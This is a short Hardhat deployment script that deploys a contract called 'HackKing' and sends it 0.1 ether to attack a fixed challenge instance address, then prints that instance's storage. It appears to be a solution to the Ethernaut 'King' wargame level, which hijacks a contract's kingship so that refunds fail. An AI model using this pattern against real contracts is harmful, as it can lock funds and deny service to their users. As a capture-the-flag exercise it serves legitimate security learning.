import { ethers } from "hardhat";

const INSTANCE = "0x9585d8E1382F459D62295248B57109199F8C37ee";

async function main() {
  const HackContract = await ethers.getContractFactory("HackKing");
  const hackContract = await HackContract.deploy();
  await hackContract.deployed();

  const callData = HackContract.interface.encodeFunctionData("send", [
    INSTANCE,
  ]);
  const transaction = {
    to: hackContract.address,
    data: callData,
    value: "100000000000000000",
    gasLimit: 150000,
  };
  const signer = (await ethers.getSigners())[0];
  const tx = await signer.sendTransaction(transaction);
  await tx.wait();

  console.log("successfully send transaction");
  console.log(await ethers.provider.getStorageAt(INSTANCE, 0));
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
